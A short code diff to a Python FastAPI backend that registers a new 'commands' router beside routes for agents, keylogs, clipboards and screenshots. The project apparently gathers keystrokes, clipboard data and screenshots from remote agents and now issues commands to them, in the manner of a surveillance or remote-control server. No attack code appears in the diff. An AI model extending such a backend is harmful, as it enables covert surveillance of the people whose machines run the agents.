@@ -6,7 +6,14 @@ from contextlib import asynccontextmanager
 
 from app.core.logging import setup_logging
 from app.services.scheduler import start_scheduler, stop_scheduler
-from app.routes import agents, keylogs, metrics, clipboards, screenshots
+from app.routes import (
+    agents, 
+    keylogs, 
+    metrics, 
+    clipboards, 
+    screenshots, 
+    commands
+)
 
 setup_logging()
 logger = logging.getLogger(__name__)
@@ -50,6 +57,7 @@ app.include_router(keylogs.router)
 app.include_router(metrics.router)
 app.include_router(clipboards.router)
 app.include_router(screenshots.router)
+app.include_router(commands.router)
 
 def run_app():
     logger.info("Starting AAA API... \nExecuting on http://127.0.0.1:8000\nDocs available at http://127.0.0.1:8000/docs")
